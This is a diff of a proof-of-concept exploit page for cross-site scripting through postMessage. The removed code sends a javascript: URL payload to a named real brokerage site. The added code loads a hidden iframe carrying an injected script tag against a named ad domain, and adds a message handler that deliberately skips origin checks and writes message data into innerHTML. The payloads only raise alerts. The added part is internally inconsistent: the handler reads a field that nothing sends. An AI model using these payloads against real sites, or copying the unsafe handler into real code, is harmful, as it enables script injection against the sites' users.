@@ -1,28 +1,23 @@
+<!DOCTYPE html>
 <html>
+  <head>
+    <title>PoC: PostMessage XSS via RealizePerformance</title>
+  </head>
+  <body>
+    <h2>Malicious Parent</h2>
+    <iframe src="https://ads.realizeperformance.com/anypage?x=<script>alert('XSS')</script>"
+            width="0" height="0" style="display:none" id="evilFrame">
+    </iframe>
 
-<body>
-
-<button onclick="open_truecaller()">click me first</button>
-<button onclick="simple_alert()">click me for simple xss</button>
-<script>
-async function open_truecaller() {
-
-win_attcker = window.open("https://smallcases.upstox.com/?ctActionMode=ctBuilder");
-
-}
-
-function simple_alert() {
-win_attcker.postMessage({
-"originUrl": "https://vflxxx.github.io",
-"url": "javAscript:alert(document.domain)//",
-"variant": true,
-"message": "Dashboard",
-"evtMaster": [{}],
-"details": "test",
-"personalisation": "test"
-}, "*")
-}
-</script>
-</body>
-
+    <script>
+      // Vulnerable message handler (simulating what a real site might do)
+      window.addEventListener("message", function(event) {
+        // ❌ NO origin validation
+        if (event.data && typeof event.data === "object" && event.data.value) {
+          // ❌ Injects location.href directly into the DOM => XSS
+          document.body.innerHTML += "<h3>Injected URL:</h3>" + event.data.value;
+        }
+      });
+    </script>
+  </body>
 </html>
